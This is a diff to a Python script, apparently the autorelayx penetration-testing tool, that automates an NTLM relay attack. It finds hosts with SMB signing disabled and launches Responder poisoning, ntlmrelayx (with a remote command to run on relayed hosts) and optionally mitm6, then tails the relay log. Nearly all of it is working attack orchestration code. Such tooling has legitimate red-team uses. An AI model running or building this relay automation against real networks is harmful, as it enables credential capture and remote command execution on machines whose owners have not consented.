@@ -2,17 +2,13 @@
 
 import asyncio
 import argparse
-import re
-import os
+import time
 import sys
+import signal
 from src.utils import *
+from src.tools import *
 from src.smb import get_unsigned_hosts
-from src.process import Process
-from src.poisoner import start_responder
 from netaddr import IPNetwork, AddrFormatError
-
-# debug
-from IPython import embed
 
 def parse_args():
     # Create the arguments
@@ -21,7 +17,9 @@ def parse_args():
     parser.add_argument("-i", "--interface", help="Interface to use with Responder")
     parser.add_argument("-c", "--command", help="Remote command to run upon successful NTLM relay")
     parser.add_argument("-6", "--mitm6", action='store_true', help="Run mitm6 in conjunction with the relay attack")
-    #parser.add_argument("-p", "--privexchange", action='store_true', help="Remote command to run upon successful NTLM relay")
+    parser.add_argument("-d", "--domain", help="Domain for mitm6 to attack")
+    parser.add_argument("-t", "--target", help="Target for ntlmrelayx to relay to")
+    #parser.add_argument("-p", "--privexchange", help="Remote command to run upon successful NTLM relay")
     return parser.parse_args()
 
 def parse_hostlist(hostlist):
@@ -49,21 +47,58 @@ def parse_hostlist(hostlist):
     return hosts
 
 async def main():
-#   hostlist = args.hostlist
-    hostlist = '/home/dan/PycharmProjects/autorelayx/nocommit/home.txt'
-    hosts = parse_hostlist(hostlist)
-    unsigned_hosts = await get_unsigned_hosts(loop, hosts)
 
-    if len(unsigned_hosts) == 0:
-        print_bad('No hosts with SMB signing disabled found')
-        sys.exit()
+    if not args.target:
+    #   hostlist = args.hostlist
+        hostlist = '/home/dan/PycharmProjects/autorelayx/nocommit/home.txt'
+        hosts = parse_hostlist(hostlist)
+        unsigned_hosts = await get_unsigned_hosts(loop, hosts)
 
-    print(unsigned_hosts)
+        if len(unsigned_hosts) == 0:
+            print_bad('No hosts with SMB signing disabled found')
+            sys.exit()
+
+        print(unsigned_hosts)
 
     # Start Responder
-#    Responder = start_responder()
+    responder = start_responder(args.interface)
+    print_info(f"Running: {responder.cmd}")
     # Start ntlmrelayx
+    ntlmrelayx = start_ntlmrelayx(args)
+    print_info(f"Running: {ntlmrelayx.cmd}")
 
+    # Start mitm6
+    if args.mitm6:
+        mitm6 = start_mitm6(args)
+        print_info(f"Running: {mitm6.cmd}")
+
+    ########## CTRL-C HANDLER ##############################
+    def signal_handler(signal, frame):
+        """
+        Catch CTRL-C and kill procs
+        """
+        print_info('CTRL-C caught, cleaning up and closing')
+
+        # Kill procs
+        print_info('Killing Responder')
+        responder.kill()
+        print_info('Killing ntlmrelayx')
+        ntlmrelayx.kill()
+        if args.mitm6:
+            print_info('Killing mitm6, may take a minute')
+            mitm6.kill()
+        time.sleep(5)
+        os.remove(f'{cwd}/arp.cache')
+        print_good('Done')
+        sys.exit()
+
+    signal.signal(signal.SIGINT, signal_handler)
+    ########## CTRL-C HANDLER ##############################
+
+    ntlmrelay_file = open(f'{cwd}/logs/ntlmrelayx.log', 'r')
+    file_lines = follow_file(ntlmrelay_file)
+    for line in file_lines:
+        print('    '+line.strip())
 
 
 if __name__ == "__main__":
@@ -74,5 +109,8 @@ if __name__ == "__main__":
 
         args = parse_args()
         loop = asyncio.get_event_loop()
-        loop.run_until_complete(main())
+        try:
+            loop.run_until_complete(main())
+        except KeyboardInterrupt:
+            print("Received exit, exiting")
         loop.close()
